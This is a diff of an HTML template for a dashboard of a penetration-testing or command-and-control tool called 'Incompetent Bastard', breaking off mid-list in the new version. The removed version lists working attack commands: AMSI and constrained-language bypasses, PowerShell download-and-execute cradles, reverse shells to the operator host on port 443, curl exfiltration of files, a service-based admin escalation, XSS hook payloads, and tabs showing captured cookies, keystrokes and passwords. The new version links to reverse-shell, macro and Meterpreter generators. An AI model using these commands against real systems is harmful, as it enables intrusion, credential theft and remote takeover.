@@ -1,797 +1,369 @@
 {% extends "bootstrap/base.html" %}
-{% block title %}Incompetent Bastard{% endblock %}
+{% block title %}Incompetent Bastard - Dashboard{% endblock %}
 
-
-   {% block styles %}
-{{super()}}
-    <link href="{{url_for('static', filename='css/asciinema-player.css')}}" rel="stylesheet">
-    <link href="{{url_for('static', filename='css/incompetentbastard.css')}}" rel="stylesheet">
-
-{% endblock %}
-
-{% block scripts %}
-
-{{super()}}
-
-<script src="{{url_for('static', filename='js/amsi.fail.js')}}"></script>
-<script src="{{url_for('static', filename='js/asciinema-player.min.js')}}"></script>
-<script src="{{url_for('static', filename='js/incompetentbastard.js')}}"></script>
-
-{% endblock %}
-
-
-{% block navbar %}
-uitloggen
+{% block styles %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/dashboard-modern.css') }}" />
 {% endblock %}
 
 {% block content %}
-<div class="container">
-<div class="well">
-  <h1>Incompetent Bastard</h1>
-  <p id="updates">{{quotes}}</p>
+<div class="page-title">
+  <div>
+    <h1>Operation Dashboard</h1>
+    <div class="breadcrumbs"><a href="/">Home</a> / Dashboard</div>
+  </div>
 </div>
 
-
-<div class="panel panel-default">
-  <div class="panel-body tabs">
-    <ul class="nav nav-pills" data-tabs="tabs">
-
-
-
-  <li {{'tab0' | zet_pill(cms_pag) | safe}}><a href="#tab0" data-toggle="tab">Dashboard</a>
-
-    {% if template: %}
-      <li {{'tab1' | zet_pill(cms_pag) | safe}}><a href="#tab1" data-toggle="tab">Findings</a>
-      </li> {% else %} Create findings!  {% endif %}
-      <li><a href="#tab2" data-toggle="tab">Notes</a>
-      </li>
-<!--
-  <li class="dropdown">
-    <a class="dropdown-toggle" data-toggle="dropdown" href="#"> Agents <span class="badge">42</span>
-    <span class="caret"></span></a>
-    <ul class="dropdown-menu">
- <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Connected Agents</a></li>
-  <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Interact</a></li>
-
-  <li class="divider"></li>
-         <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Command flow</a></li>
-
-    </ul>
-  </li>
--->
-  <li class="dropdown">
-    <a class="dropdown-toggle" data-toggle="dropdown" href="#">WEB
-    <span class="caret"></span></a>
-    <ul class="dropdown-menu">
-      <li><a href="#tab3" data-toggle="tab"> Overview</a></li>
-<li class="divider"></li>
-
- {% if cookies or keylogger or localstorage or wachtwoorden: %}
-       <li role="presentation" class="dropdown-header">XXS results</li>
-       {% endif %}
-  {% if cookies: %}
-      <li><a href="#tab3" data-toggle="tab">Cookies</a>
-      </li>{% endif%}{% if  keylogger: %}
-      <li><a href="#tab4" data-toggle="tab">Keylogger</a>
-      </li>{% endif %}
-      {% if localstorage: %}
-      <li><a href="#tab5" data-toggle="tab">LocalStorage</a>
-      </li>{% endif%}{% if   wachtwoorden: %}
-      <li><a href="#tab6" data-toggle="tab">Password</a>
-      </li>{% endif %}
-           <li class="divider"></li>
-         <li><a href="/dashboard" target="_blank">Custom HTA</a></li>
-         <li><a href="/dashboard" target="_blank">Custom SCT</a></li>
-         <li><a href="/dashboard" target="_blank">Custom CPROJ</a></li>
-         <li><a href="/dashboard" target="_blank">Custom XSS</a></li>
-         <li><a href="/dashboard" target="_blank">Custom XXE</a></li>
-         <li><a href="/dashboard" target="_blank">Custom CSRF</a></li>
-         <li><a href="/dashboard" target="_blank">Custom SSRF</a></li>
-    </ul>
-  </li>
-  <li class="dropdown">
-    <a class="dropdown-toggle" data-toggle="dropdown" href="#">Commands
-    <span class="caret"></span></a>
-    <ul class="dropdown-menu">
-      <li><a href="#tab8" data-toggle="tab">Shells & Payloads</a>
-        <li><a href="#tab8b" data-toggle="tab">LOLBAS</a>
-          <li><a href="#tab8c" data-toggle="tab">Pivotting</a>
-      <li><a href="#tab9" data-toggle="tab">Commands</a></li>
-        <li><a href="#tab10" data-toggle="tab">Rubeus and Mimikatz</a></li>
-        <li><a href="#tab11" data-toggle="tab">Enummeration WEB</a></li>
-        <li><a href="#tab9" data-toggle="tab">Flask admin</a></li>
-    </ul>
-  </li>
-  <li class="dropdown">
-    <a class="dropdown-toggle" data-toggle="dropdown" href="#">Bookmarks
-    <span class="caret"></span></a>
-    <ul class="dropdown-menu">
-
-      <li class="divider"></li>
-      <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">bitvijays.github.io (Vulnerable Machines)</a></li>
-      <li><a href="https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html" target="_blank">bitvijays.github.io (Vulnerability Analysis)</a></li>
-
-      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">Payload All the Things</a></li>
-
-      <li><a href="https://book.hacktricks.xyz/welcome/readme" target="_blank">book.hacktricks.xyz</a></li>
-      <li><a href="https://attack.mitre.org/matrices/enterprise/" target="_blank">MITRE ATT&CK Enterprise Matrix</a></li>
-      <li><a href="https://owasp.org/Top10/" target="_blank">OWASP Top 10</a></li>
-      <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/" target="_blank">OWASP WSTG - Latest</a></li>
-      <li><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank">CISA.gov known-exploited-vulnerabilities-catalog</a></li>
-      <li><a href="https://inthewild.io/feed" target="_blank">inTheWild Vulnerability Feed</a></li>
-
-
-
-      <li><a href="https://github.com/esidate/pentesting-active-directory/blob/main/v1/pentesting_active_directory_dark.png" target="_blank">Orange Cyberdefense V1 Active directory</a></li>
-         <li><a href="https://github.com/esidate/pentesting-active-directory/blob/main/v2/pentesting_active_directory.svg" target="_blank">Orange Cyberdefense V2 Active directory</a></li> 
-
-           <li class="divider"></li>
-         <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Add Bookmark</a></li>
-    </ul>
-  </li>
-
-
-    </ul>
-    <div class="tab-content">
-<div class="tab-pane fade {{'tab0' | zet_actief(cms_pag)}}" id="tab0">
-
-<h1>Dashboard</h1>
-<div id="poller">
-We have {{aantalhooked}} hits on xxs.js
-
-
-<h4>Available screens</h4>
-<pre id="pollscreens">{{screens}}
-</pre>
-<h4>Available MSF sessions</h4>
-<pre id="pollsessions">
-sessions
-</pre>
-
-<h4>Nmap -Pn -sT -sV -d -A -F --open</h4>
-{% for x in nmap %}
-
-<pre>{{x | inhoudweergeven}}</pre>
-
-{% endfor %}
-</div>    
-</div>
-{% if template: %}
-<div class="tab-pane fade {{'tab1' | zet_actief(cms_pag)}}" id="tab1">
-<a class="btn btn-success pull-right" href="/dashboard/findings/rapport" target="_blank">Generate rapport</a>
-<h1>Findings</h1>
-
-<p><span class="webtoggle">WEB</span> MOBIEL INTERNAL</p>
-
-<hr />
-{% for x in template: %}
-<h4 class="{{x.bevtype}}" title="{{x.enbeschrijving}}">{{x.titel}}</h4>
-<ul class="{{x.bevtype}}">
-{{ x.id | bevindingen_halen(bevindingen) | safe}}
-
-
-<li><a href="#" class="modalweergeven" data-title="{{x.titel}}" data-rel="/dashboard/findings/add/{{x.id}}">Add {{x.titel}} finding</a></li>
-</ul>
- {% endfor %}
-
-
- </div>
-{% endif %}
-<div class="tab-pane fade" id="tab2">
-<a class="btn btn-success pull-right" href="/dashboard/findings/notes" target="_blank">Generate notes</a>    
-<h1>Notes</h1>
-
-
-
-
-
-
-
-
-</div>
-{% if cookies: %}
-<div class="tab-pane fade" id="tab3">
-<h1>Cookies</h1>
-{% for x in cookies: %}
-<h4>{{x.locatie}}</h4>
-<p><a href="/dashboard/xxs/download_cookies/{{x.id}}">[download]</a> <strong>{{x.ip}}</strong> <small>{{x.agent}}</small><pre>{{x.cookies}}</pre></p>
-{% endfor %}
-</div>
-{% endif %}
-
-{% if  keylogger: %}
-<div class="tab-pane fade" id="tab4">
-<h1>Keylogger</h1>
-
-{% for x in keylogger: %}
-<h4>{{x.locatie}}</h4>
-<p><a href="/dashboard/xxs/download_toetsen/{{x.id}}">[download]</a> {{x.ip}} <small>{{x.agent}}</small><pre>{{x.toetsen}}</pre></p>
-{% endfor %}
-</div>
-{% endif %}
-{% if  localstorage: %}
-<div class="tab-pane fade" id="tab5">
-<h1>Localstorage</h1>
-{% for x in localstorage: %}
-<h4>{{x.locatie}}</h4>
-<p><a href="/dashboard/xxs/download_localstorage/{{x.id}}">[download]</a> {{x.ip}}  <small>{{x.agent}}</small><pre>{{x.localstorage}}</pre></p>
-{% endfor %}
-</div>
-{% endif %}
-{% if  wachtwoorden %}
-<div class="tab-pane fade" id="tab6">
-<h1>Wachtwoorden</h1>
-{% for x in wachtwoorden: %}
-<h4>{{x.locatie}}</h4>
-<p><a href="/dashboard/xxs/download_creds/{x.id}}">[download]</a> {{x.ip}}  <small>{{x.agent}}</small><pre>{{x.username}}   {{x.password}}</pre></p>
-{% endfor %}
-</div>
-{% endif %}
-<div class="tab-pane fade" id="tab8">
-<h1>Shells & Payloads</h1>
-<h4>XXS Payloads</h4>
-<p>Jquery jQuery.getScript('{{appdata.localhost}}/x.js');</p>
-<pre>'+eval(atob('{{js1}}'))+'</pre>
-<p>Stand alone: &lt;script src="{{appdata.localhost}}/x.js"&gt;&lt/script&gt;</p>
-<pre>'+btoa(eval(atob('{{js2}}')))+'</pre>
-
-
-<h4>Handy stuff</h4>
-<p>Extracting files from hosts (use curl.exe for powershell)</p>
-<pre>curl -F file=@FILENAME {{appdata.localhost}}/upload</pre>
-<p>Upgrading shell...</p>
-<pre>python -c'import pty; pty.spawn("/bin/bash")'</pre>
-<p>Constrained language</p>
-
-<pre>$ExecutionContext.SessionState.LanguageMode</pre>
-
-<h4>Spear phishing</h4>
-
-<p>Word Macro with meterpreter 443 is available at http/payloads/macro.txt</p>
-
-
-<p>HTA</p>
-
-<p>Send an email</p>
-
-
-<h4>CLM & AMSI bypasses</h4>
-<p>Basic bypass</p>
-<pre>
-$CurrTemp = $env:temp
-$CurrTmp = $env:tmp
-$TEMPBypassPath = "C:\windows\temp"
-$TMPBypassPath = "C:\windows\temp"
-
-Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
-Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"
-
-Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe"
-sleep 5
-
-#Set it back
-Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
-Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp       
-</pre>
-
-<p><strong>OffSec</strong></p>
-<pre>$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);</pre>
-
-<p><strong>Amsi.fail  <span class="amsi-method">Basic bypass</span></strong></p>
-
-<textarea cols="50" id="PowerShellOut" rows="10">$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);</textarea><br>
-<button class="custom-button custom-button-primary" onclick="GeneratePS()">Generate</button>
-<button class="custom-button custom-button-primary" onclick="GenerateEncPS()">Generate Encoded</button>
-
-
-<p>InviShell user.bat</p>
-
-<pre>curl {{appdata.localhost}}/tools/invisi.dll -o c:\windows\tasks\invisi.dll & curl {{appdata.localhost}}/tools/user.bat -o c:\windows\tasks\user.bat & c:\windows\tasks\user.bat</pre>
-
-<p>InviShell admin.bat</p>
-
-<pre>curl {{appdata.localhost}}/tools/invisi.dll -o c:\windows\tasks\invisi.dll & curl {{appdata.localhost}}/tools/admin.bat -o c:\windows\tasks\user.bat & c:\windows\tasks\admin.bat</pre>
-
-
-<p>PsBypassCLM.exe</p>
-<pre>curl {{appdata.localhost}}/tools/PsBypassCLM.exe -o c:\windows\tasks\PsBypassCLM.exe & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U C:\windows\tasks\PsBypassCLM.exe</pre>
-
-<p>PsBypassCLM.exe with reverse shell</p>
-<pre>curl {{appdata.localhost}}/tools/PsBypassCLM.exe -o c:\windows\tasks\PsBypassCLM.exe & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost={{appdata.localhost | zet_ip}} /rport=443 /U C:\windows\tasks\PsBypassCLM.exe</pre>
-
-
-
-<p>Amsi bypass Meterpreter 443</p>
-<pre>powershell -e {{ "IEX ((New-Object Net.WebClient).DownloadString('[host]/payloads/amsi-bypass.ps1'));" | winbas64}}</pre>
-
-<p>Amsi bypass shell 443</p>
-<pre>powershell -e {{ "IEX ((New-Object Net.WebClient).DownloadString('[host]/payloads/amsi-shell.ps1'));" | winbas64}}</pre>
-
-
-
-<h4>Basic Privesc</h4>
-<p>PowerUp.ps1</p>
-<pre>powershell -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('{{appdata.localhost}}/tools/PowerUp.ps1');Invoke-AllChecks > PowerUp_$(iex hostname);curl.exe -F file=@PowerUp_$(iex hostname) {{appdata.localhost}}/upload/"</pre>
-<p>PowerUp.ps1 encoded</p>
-
-
-<pre>powershell -e {{ "IEX (New-Object Net.WebClient).DownloadString('[host]/tools/PowerUp.ps1');Invoke-AllChecks > PowerUp_$(iex hostname);curl.exe -F file=@PowerUp_$(iex hostname) [host]/upload/" | winbas64}}</pre>
-
-
-
-<p>PrivescCheck.ps1</p>
-<pre>IEX ((New-Object Net.WebClient).DownloadString('{{appdata.localhost}}/tools/PrivescCheck.ps1'));Invoke-PrivescCheck -Extended -Report PrivescCheck_$(iex hostname);curl.exe -F file=@PrivescCheck_$(iex hostname).txt {{appdata.localhost}}/upload/</pre>
-<p>PrivescCheck.ps1 encoded</p>
-
-
-<pre>powershell -e {{ "IEX ((New-Object Net.WebClient).DownloadString('[host]/tools/PrivescCheck.ps1'));Invoke-PrivescCheck -Extended -Report PrivescCheck_$(iex hostname);curl.exe -F file=@PrivescCheck_$(iex hostname).txt [host]/upload/" | winbas64}}</pre>
-
-<p>SNMPTRAP</p>
-<pre>
-sc config SNMPTRAP obj= "NT AUTHORITY\SYSTEM" password= ""
-sc config snmptrap binpath= "C:\Windows\System32\net.exe localgroup Administrators jan-karel /add"
-</pre>
-<p>Always Install elevated</p>
-<pre>
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-</pre>
-
-
-<p>Find-PSRemotingLocalAdminAccess.ps1</p>
-<pre>powershell -exec Bypas
-</pre>
-
-<p>Invoke-PowerShellTcp.ps1</p>
-<pre>    
-powershell.exe -c iex "((New-Object Net.WebClient).DownloadString('{{appdata.localhost}}/tools/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress {{appdata.localhost | zet_ip}} -Port 443"
-</pre>
-<p>of....</p>
-
-<pre>
-powershell.exe iex "(iwr http://{{appdata.localhost}}/tools/Invoke-PowerShellTcp.ps1 - UseBasicParsing);Power -Reverse -IPAddress {{appdata.localhost | zet_ip}} -Port 443"
-</pre>
-
-<h4>Basic AD Enummeration</h4>
-<p><strong>Powerview.ps1</strong> basic amsibypass & loads powerview plus returns data with curl</p>
-<pre>$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);IEX ((New-Object Net.WebClient).DownloadString('{{appdata.localhost}}/tools/PowerView.ps1'));echo "## hostname:" > PowerView_$(iex hostname);hostname >> PowerView_$(iex hostname);echo "## ipconfig:" >> PowerView_$(iex hostname);ipconfig >> PowerView_$(iex hostname);echo "## whoami:" >> PowerView_$(iex hostname);whoami >> PowerView_$(iex hostname);echo "## whoami /priv:" >> PowerView_$(iex hostname);whoami /priv >> PowerView_$(iex hostname);echo "## whomai /groups:" >> PowerView_$(iex hostname);whoami /groups >> PowerView_$(iex hostname);echo "## net group Domain Computers /domain:" >> PowerView_$(iex hostname);net group "Domain Computers" /domain >> PowerView_$(iex hostname);echo "## net group Domain Admins /domain:" >> PowerView_$(iex hostname);net group "Domain Admins" /domain >> PowerView_$(iex hostname);echo "## nltest /domain_trusts" >> PowerView_$(iex hostname);nltest /domain_trusts >> PowerView_$(iex hostname);echo "## nltest /all_trusts" >> PowerView_$(iex hostname);nltest /all_trusts >> PowerView_$(iex hostname);echo "## ====PowerView====" >> PowerView_$(iex hostname);echo "## Get-DomainUser:" >> PowerView_$(iex hostname);Get-DomainUser >> PowerView_$(iex hostname);echo "## Get-DomainUser -SPN:" >> PowerView_$(iex hostname);Get-DomainUser -SPN >> PowerView_$(iex hostname);echo "## Get-DomainComputer:" >> PowerView_$(iex hostname);Get-DomainComputer | select -ExpandProperty dnshostname >> PowerView_$(iex hostname);echo "## Get-DomainGroup -Identity Domain Admins:" >> PowerView_$(iex hostname);Get-DomainGroup -Identity "Domain Admins" >> PowerView_$(iex hostname);echo "## DomainOU" >> PowerView_$(iex hostname);Get-DomainOU >> PowerView_$(iex hostname);echo "## DomainGPO" >> PowerView_$(iex hostname);Get-DomainGPO >> PowerView_$(iex hostname);echo "## Get-DomainTrust" >> PowerView_$(iex hostname);Get-DomainTrust >> PowerView_$(iex hostname);echo "## Get-NetComputer -UnConstrained" >> PowerView_$(iex hostname);Get-NetComputer -UnConstrained >> PowerView_$(iex hostname);echo "## Get-NetUser | select samaccountname,description:" >> PowerView_$(iex hostname);Get-NetUser | select samaccountname,description >> PowerView_$(iex hostname);echo "## Get-NetUser -TrustedToAuth:" >> PowerView_$(iex hostname);Get-NetUser -TrustedToAuth >> PowerView_$(iex hostname);echo "## Get-NetComputer -TrustedToAuth" >> PowerView_$(iex hostname);Get-NetComputer -TrustedToAuth >> PowerView_$(iex hostname);curl.exe -F file=@PowerView_$(iex hostname) {{appdata.localhost}}/upload/</pre>
-<p>More PowerView enummeratation ACL & DACL</p>
-
-<pre>Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}</pre>
-
-<pre>Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}</pre>
-
-<p>AceType: AccessAllowed WriteDacl</p>
-<pre>Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All</pre>
-<p>Sharp-Hound</p>
-
-<p>Check <code>nltest /domain_trusts</code> for domains</p>
-
-<pre>curl {{appdata.localhost}}/tools/SharpHound.exe -o c:\windows\tasks\SharpHound.exe & c:\windows\tasks\SharpHound.exe --CollectionMethods All,GPOLocalGroup --searchforest --OutputPrefix "Forest" </pre>
-
-<pre>curl {{appdata.localhost}}/tools/SharpHound.exe -o c:\windows\tasks\SharpHound.exe & c:\windows\tasks\SharpHound.exe --CollectionMethods All,GPOLocalGroup --OutputPrefix "Domain" </pre>
-
-
-<p>SharpHound AMSI bypass</p>
-
-
-
-<p>Run quickwin</p>
-
-
-
-
-<h4>Basic reverse shells</h4>
-
-<p>Basic injection</p>
-<pre>$data = (New-Object System.Net.WebClient).DownloadData('{{appdata.localhost}}/payloads/methtcp.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)</pre>
-
-<p>Powershell encoded</p>
-<pre>powershell -e {{ "$data = (New-Object System.Net.WebClient).DownloadData('[host]/payloads/methtcp.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)" | winbas64}}</pre>
-
-<p>Basic injection generic</p>
-<textarea cols="50" id="basic_out" data="$data = (New-Object System.Net.WebClient).DownloadData('{{appdata.localhost}}/payloads/methtcp.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)" rows="10"></textarea><br>
-<button class="custom-button custom-button-primary" onclick="Generate_out()">Generate</button><button class="custom-button custom-button-primary" onclick="Generate_outenc()">Generate enc</button>
-
-
-
-<p>Basic injection Meterpreter port 8080</p>
-<pre>$data = (New-Object System.Net.WebClient).DownloadData('{{appdata.localhost}}/payloads/meth8080.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)</pre>
-
-<p>Powershell encoded Meterpreter port 8080</p>
-<pre>powershell -e {{ "$data = (New-Object System.Net.WebClient).DownloadData('[host]/payloads/meth8080.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)" | winbas64}}</pre>
-
-<p>Basic injection Meterpreter port 8080 generic</p>
-<textarea cols="50" id="meter_out" data="$data = (New-Object System.Net.WebClient).DownloadData('{{appdata.localhost}}/payloads/meth8080.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)"rows="10"></textarea><br>
-<button class="custom-button custom-button-primary" onclick="Generate_meter()">Generate</button><button class="custom-button custom-button-primary" onclick="Generate_meterenc()">Generate enc</button>
-
-
-
-<h4>More stuff generated with ./reverseshells.sh</h4>
-<pre>
-{{shells}}
-</pre>
-</div>
-<div class="tab-pane fade" id="tab8c">
-    <h1>PIVOTS</h1>
-
-</div>
-<div class="tab-pane fade" id="tab8b">
-  <h1>LOLBAS</h1>
-
-<p>sct</p>
-
-<p>sct</p>
-
-<p>hta</p>
-
-
-<p>hta</p>
-
-
-<p>hta</p>
-
-
-<p>hta</p>
-
-
-<p>hta</p>
-
-
-<p>hta</p>
-
-
-<p>hta</p>
-
-
-<p>hta</p>
-
-
-
-
-
-
-</div>
-<div class="tab-pane fade" id="tab9">
-<h1>Commands</h1>
-<p>Some basic commands</p>
-{% for x in commands: %}
-  {{x | inhoudweergeven(1) | safe}}
-{% endfor %}
-</div>
-
-<div class="tab-pane fade" id="tab10">
-<h1>Rubeus and Mimikatz</h1>
-
-
-</div>
-
-
-
-<div class="tab-pane fade" id="tab11">
-<h1>Enummeration WEB</h1>
-<pre>apt install payloadsallthethings hakrawler seclists</pre>
-<p>Basic settings</p>
-<pre>
-export SCANURL="http://target:80"
-</pre>
-<h4>SSTI</h4>
-<pre>{{'{{2*21}}'}}
-${2*21}
-<%= 2*21 %>
-${{'{{2*21}}'}}
-#{2*21}</pre>
-<h4>Wfuzz</h4>
-
-<p>Directory discovery</p>
-<pre>wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404,301 "$SCANURL/FUZZ/"</pre>
-
-<p>Authenticated directory discovery</p>
-<pre>wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 -b "PARAM=value" "$SCANURL/FUZZ/"</pre>
-
-<p>File discovery</p>
-<pre>wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 301,404 "$SCANURL/FUZZ"</pre>
-
-<p>Authenticated file fuzzing</p>
-<pre>wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 301,404,403 -b "PARAM=value" "$SCANURL/FUZZ"</pre>
-
-<p>Parameter discovery</p>
-<pre>wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 "$SCANURL/FUZZ=data"</pre>
-
-<p>GET parameter values</p>
-<pre>wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404,301 "$SCANURL/index.php?parameter=FUZZ"</pre>
-
-<p>html_escape fuzzing</p>
-<pre>wfuzz -c -z file,/usr/share/wordlists/Fuzzing/yeah.txt "$SCANURL/FUZZ"</pre>
-
-<p>XSS</p>
-<pre>wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt --hh 0 "$SCANURL/index.php?id=FUZZ"</pre>
-<p>Fuzzing GET parameter</p>
-<pre>wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$SCANURL/index.php?id=FUZZ"</pre>
-
-<p>Fuzzing POST parameter</p>
-<pre>wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$SCANURL/index.php"</pre>
-<p>LFI</p>
-<pre>wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 0 "$SCANURL/index.php?id=FUZZ"</pre>
-
-<p>command injection</p> 
-<pre>wfuzz -c -z file,"/usr/share/payloadsallthethings/Command Injection/Intruder/command-execution-unix.txt" --sc 200 "$SCANURL/index.php?parameter=idFUZZ"</pre>
-
-<p>Static file IDOR</p> 
-<pre>wfuzz -c -z range,1-100 --hc 404 "$SCANURL/index.php?doc=FUZZ.txt"</pre>
-<p>ID based IDOR </p>
-<pre>wfuzz -c -z range,1-100 --hc 404 "$SCANURL/index.php?doc=FUZZ"</pre>
-
-<p>Users discovery</p>
-<pre>wfuzz -c -z file,/usr/share/seclists/Usernames/top-username-shortlist.txt --hc 404,403 "$SCANURL/login.php?user=FUZZ"</pre>
-<p>Password discovery</p>
-<pre>wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404,403 -d "username=admin&password=FUZZ" "$SCANURL/login.php"</pre>
-
-
-<h4>Gobuster</h4>
-
-<p>Endpoint discovery</p>
-<pre>gobuster dir -u $SCANURL -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt</pre>
-
-<p>Subdomain discovery</p>
-<pre>gobuster dns -d $SCANURL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</pre>
-
-<h4>Hakrawler</h4>
-<pre>
-echo "$SCANURL" > urls.txt
-cat urls.txt | hakrawler
-</pre>
-
-
-</div>
-
-
-</div>
-</div>
-</div>
-<p>&copy; Jan-Karel Visser | <a href="https://incompetentbastard.com">Incompetent Bastard</a></p>
-
-<div class="modal fade grotemodalweergeven" tabindex="-1" role="dialog" aria-labelledby="Mijn grote model" aria-hidden="true">
-  <div class="modal-dialog modal-xl">
-    <div class="modal-content">
-
-      <div class="modal-header">
-        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-        <h2 class="modal-title h6" id="grotemodal">Overzicht</h2>
-
+<div class="grid cols-5">
+  <section class="card">
+    <div class="card-body">
+      <div class="kpi">
+        <div>
+          <div class="val accent-green" id="kpi-agents">0</div>
+          <div class="sub">Active Agents</div>
+        </div>
       </div>
-      <div class="modal-body mijn-tekst">
+    </div>
+  </section>
 
+  <section class="card">
+    <div class="card-body">
+      <div class="kpi">
+        <div>
+          <div class="val accent-orange">{{ aantalhooked }}</div>
+          <div class="sub">Hooked Clients</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="card">
+    <div class="card-body">
+      <div class="kpi">
+        <div>
+          <div class="val accent-blue">{{ bevindingen|length }}</div>
+          <div class="sub">Findings</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="card">
+    <div class="card-body">
+      <div class="kpi">
+        <div>
+          <div class="val">{{ notes|length }}</div>
+          <div class="sub">Notes</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="card">
+    <div class="card-body">
+      <div class="kpi">
+        <div>
+          <div class="val">{{ commands|length }}</div>
+          <div class="sub">Commands</div>
+        </div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<section class="card mt-14">
+  <div class="card-head">
+    <h2>Active Agents</h2>
+    <a href="/dashboard/agents" class="btn btn-link ml-auto fs-12">All agents &rarr;</a>
+  </div>
+  <div class="card-body">
+    <div id="agent-panel" class="agent-panel">
+      <p class="help">Laden...</p>
+    </div>
+  </div>
+</section>
+
+<div class="grid cols-2 mt-14">
+  <section class="card">
+    <div class="card-head">
+      <h2>Quick Actions</h2>
+    </div>
+    <div class="card-body action-row">
+      <a class="btn btn-primary" href="/dashboard/tasks">Run tasks</a>
+      <a class="btn" href="/dashboard/outputs">Outputs</a>
+      <a class="btn" href="/dashboard/findings">Findings</a>
+      <a class="btn" href="/dashboard/files">Files</a>
+      <a class="btn" href="/dashboard/report">Report</a>
+      <button class="btn" id="btn-scope" type="button">Scope</button>
+      <a class="btn" href="/dashboard/admin" target="_blank">Admin</a>
+      <a class="btn" href="/dashboard/recordings">Recordings</a>
+      <a class="btn" href="/dashboard/screen">Screen</a>
+      <a class="btn" href="/dashboard/agents">Agents</a>
+    </div>
+  </section>
+
+  <section class="card">
+    <div class="card-head">
+      <h2>Payload Generators</h2>
+    </div>
+    <div class="card-body action-row">
+      <a class="btn btn-primary" href="/dashboard/reverseshells">Reverse Shells</a>
+      <a class="btn" href="/dashboard/macro">Office Macro</a>
+      <a class="btn" href="/dashboard/macro2">Macro v2</a>
+      <a class="btn" href="/dashboard/meterpreter">Meterpreter</a>
+      <a class="btn" href="/dashboard/meterpreter2">Meterpreter v2</a>
